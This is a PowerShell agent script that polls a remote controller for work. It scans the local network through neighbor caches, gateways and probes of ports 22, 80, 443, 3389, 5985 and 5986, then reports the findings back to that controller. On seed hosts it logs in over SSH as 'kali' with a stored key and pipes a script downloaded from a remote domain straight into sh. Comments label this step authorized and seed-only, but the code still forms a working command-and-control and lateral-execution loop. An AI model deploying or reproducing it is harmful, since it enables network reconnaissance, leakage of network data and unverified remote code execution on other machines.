$ErrorActionPreference='Stop'
$Controller='https://arkmatx.com/aurum/index.php'
$Root=if($env:AURUM_HOME){$env:AURUM_HOME}else{Join-Path $env:USERPROFILE '.aurum'}
$ConfigPath=Join-Path $Root 'node.json'
$LogPath=Join-Path $Root 'worker.log'
$KeyPath=Join-Path $HOME '.ssh\boxbrain_pi_ed25519'
$ProbePorts=@(22,80,443,5985,5986,3389)
$MaxDiscoveredCandidates=32

function Log($m){Add-Content -LiteralPath $LogPath -Value ("{0:o} {1}" -f [DateTimeOffset]::UtcNow,$m)}
function Post-Result($nodeId,$workId,$status,$detail){$body=[ordered]@{node_id=$nodeId;work_id=$workId;status=$status;detail=$detail;completed_at=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()};try{Invoke-RestMethod -Method Post -Uri "$Controller/work/result" -ContentType 'application/json' -Body ($body|ConvertTo-Json -Depth 12 -Compress)|Out-Null}catch{Log "result-post-failed $($_.Exception.Message)"}}
function Probe-Tcp($address,$port){try{return [bool](Test-NetConnection -ComputerName $address -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue)}catch{return $false}}
function Test-PrivateOrLinkLocalIPv4([string]$Address){
  $ip=$null
  if(-not [System.Net.IPAddress]::TryParse($Address,[ref]$ip)){return $false}
  $bytes=$ip.GetAddressBytes();if($bytes.Length -ne 4){return $false}
  if($bytes[0] -eq 10){return $true}
  if($bytes[0] -eq 172 -and $bytes[1] -ge 16 -and $bytes[1] -le 31){return $true}
  if($bytes[0] -eq 192 -and $bytes[1] -eq 168){return $true}
  if($bytes[0] -eq 169 -and $bytes[1] -eq 254){return $true}
  return $false
}
function Add-Candidate([System.Collections.Generic.HashSet[string]]$set,$value,[bool]$RequireLocal){
  if($null -eq $value){return}
  $v=([string]$value).Trim();if(-not $v){return}
  if($v -match '^(0\.0\.0\.0|127\.|::|fe80:)'){return}
  if($RequireLocal -and -not (Test-PrivateOrLinkLocalIPv4 $v)){return}
  $null=$set.Add($v)
}
function Get-Candidates($work,[bool]$IncludeSystemDiscovery=$true){
  $set=New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
  $seeds=@('10.12.194.1','10.42.194.1','bbpi4.local','192.168.0.194')
  if($work.payload.addresses){$seeds=@($work.payload.addresses)}
  foreach($v in $seeds){Add-Candidate $set $v $false}
  if($IncludeSystemDiscovery){
    try{foreach($n in @(Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.State -ne 'Unreachable'} | Sort-Object InterfaceIndex,IPAddress)){Add-Candidate $set $n.IPAddress $true;if($set.Count -ge $MaxDiscoveredCandidates){break}}}catch{}
    if($set.Count -lt $MaxDiscoveredCandidates){try{foreach($r in @(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Sort-Object RouteMetric,InterfaceMetric)){Add-Candidate $set $r.NextHop $true;if($set.Count -ge $MaxDiscoveredCandidates){break}}}catch{}}
    if($set.Count -lt $MaxDiscoveredCandidates){try{foreach($c in @(Get-NetIPConfiguration -ErrorAction SilentlyContinue)){if($c.IPv4DefaultGateway){Add-Candidate $set $c.IPv4DefaultGateway.NextHop $true};if($set.Count -ge $MaxDiscoveredCandidates){break}}}catch{}}
  }
  return @($set | Select-Object -First $MaxDiscoveredCandidates)
}
function Get-SeedSet($work){
  $set=New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
  $seeds=@('10.12.194.1','10.42.194.1','bbpi4.local','192.168.0.194')
  if($work.payload.addresses){$seeds=@($work.payload.addresses)}
  foreach($v in $seeds){if($null -ne $v){$null=$set.Add(([string]$v).Trim())}}
  return $set
}
function Try-AuthorizedSshBootstrap($address,$ssh,$keyPresent){
  if(-not $ssh -or -not $keyPresent){return @{attempted=$false;exit=$null;output=$null}}
  $args=@('-i',$KeyPath,'-o','BatchMode=yes','-o','IdentitiesOnly=yes','-o','ConnectTimeout=5','-o','StrictHostKeyChecking=accept-new',"kali@$address",'curl -fsSL https://aurum.arkmatx.com/bootstrap.sh | sh')
  $output=& $ssh.Source @args 2>&1;$code=$LASTEXITCODE
  return @{attempted=$true;exit=$code;output=(@($output|Select-Object -Last 12)-join "`n")}
}
function Invoke-BBPI4Bootstrap($nodeId,$work){
  $addresses=Get-Candidates $work $true;$seedSet=Get-SeedSet $work
  $ssh=(Get-Command ssh.exe -ErrorAction SilentlyContinue | Select-Object -First 1)
  $keyPresent=Test-Path -LiteralPath $KeyPath -PathType Leaf
  $observations=@()
  foreach($address in $addresses){
    $isSeed=$seedSet.Contains([string]$address)
    $obs=[ordered]@{address=$address;seed_route=$isSeed;icmp=$false;ssh22=$false;http80=$false;https443=$false;rdp3389=$false;winrm5985=$false;winrms5986=$false;winrm_wsman=$false;ssh_attempted=$false;ssh_exit=$null}
    try{$obs.icmp=[bool](Test-Connection -ComputerName $address -Count 1 -Quiet -ErrorAction SilentlyContinue)}catch{}
    $obs.ssh22=Probe-Tcp $address 22;$obs.http80=Probe-Tcp $address 80;$obs.https443=Probe-Tcp $address 443;$obs.rdp3389=Probe-Tcp $address 3389;$obs.winrm5985=Probe-Tcp $address 5985;$obs.winrms5986=Probe-Tcp $address 5986
    if($obs.winrm5985 -or $obs.winrms5986){try{Test-WSMan -ComputerName $address -ErrorAction Stop | Out-Null;$obs.winrm_wsman=$true}catch{}}
    # Newly discovered Ethernet/AP/LAN peers remain observation-only. Only explicit
    # BBPI4 seed routes may receive the bootstrap until target identity is verified.
    if($isSeed -and $obs.ssh22){$r=Try-AuthorizedSshBootstrap $address $ssh $keyPresent;$obs.ssh_attempted=[bool]$r.attempted;$obs.ssh_exit=$r.exit;$observations += [pscustomobject]$obs;if($r.attempted -and $r.exit -eq 0){return @{status='completed';detail=@{address=$address;carrier='ssh';node_id=$nodeId;observations=$observations;candidate_count=$addresses.Count;output=$r.output}}};if($r.attempted){Log "bbpi4 ssh failed address=$address code=$($r.exit)"};continue}
    $observations += [pscustomobject]$obs
  }
  $reason=if(-not $ssh){'ssh-client-unavailable'}elseif(-not $keyPresent){'authorized-pi-key-missing'}else{'no-authorized-bbpi4-ssh-route'}
  return @{status='failed';detail=@{reason=$reason;key=$KeyPath;node_id=$nodeId;candidates=$addresses;candidate_count=$addresses.Count;discovery_limit=$MaxDiscoveredCandidates;observations=$observations;safe_carriers_tried=@('ethernet','wifi-ap','neighbor-cache','gateway-route','icmp','tcp22','tcp80','tcp443','tcp3389-rdp','tcp5985-winrm','tcp5986-winrm-tls','wsman','ssh-seeded-only')}}
}

if($env:AURUM_WORKER_SELFTEST -eq '1'){
  if(-not (Test-PrivateOrLinkLocalIPv4 '10.12.194.1')){throw '10/8 classification failed'}
  if(-not (Test-PrivateOrLinkLocalIPv4 '192.168.0.194')){throw '192.168/16 classification failed'}
  if(-not (Test-PrivateOrLinkLocalIPv4 '169.254.10.20')){throw 'link-local classification failed'}
  if(Test-PrivateOrLinkLocalIPv4 '8.8.8.8'){throw 'public address classified as local'}
  $work=[pscustomobject]@{payload=[pscustomobject]@{addresses=@('10.12.194.1','bbpi4.local','10.12.194.1')}}
  $candidates=Get-Candidates $work $false
  if($candidates.Count -ne 2){throw "candidate de-duplication failed: $($candidates.Count)"}
  $seeds=Get-SeedSet $work
  if(-not $seeds.Contains('10.12.194.1') -or -not $seeds.Contains('bbpi4.local')){throw 'seed-set construction failed'}
  foreach($requiredPort in @(22,80,443,5985,5986,3389)){if($ProbePorts -notcontains $requiredPort){throw "missing carrier port $requiredPort"}}
  [pscustomobject]@{ok=$true;candidate_count=$candidates.Count;probe_ports=$ProbePorts;discovery_limit=$MaxDiscoveredCandidates;execution_scope='seed-routes-only'}|ConvertTo-Json -Compress
  exit 0
}

while($true){try{if(-not (Test-Path -LiteralPath $ConfigPath -PathType Leaf)){Start-Sleep -Seconds 5;continue};$cfg=Get-Content -LiteralPath $ConfigPath -Raw|ConvertFrom-Json;$nodeId=[string]$cfg.node_id;$lease=Invoke-RestMethod -Method Get -Uri "$Controller/work/lease?node_id=$([uri]::EscapeDataString($nodeId))&capabilities=bbpi4-bootstrap" -TimeoutSec 20;if($lease.work){$work=$lease.work;Log "leased $($work.work_id) capability=$($work.capability)";if([string]$work.capability -eq 'bbpi4-bootstrap'){$r=Invoke-BBPI4Bootstrap $nodeId $work}else{$r=@{status='rejected';detail=@{reason='capability-not-allowlisted'}}};Post-Result $nodeId ([string]$work.work_id) ([string]$r.status) $r.detail}}catch{Log "cycle-error $($_.Exception.Message)"};Start-Sleep -Seconds 8}
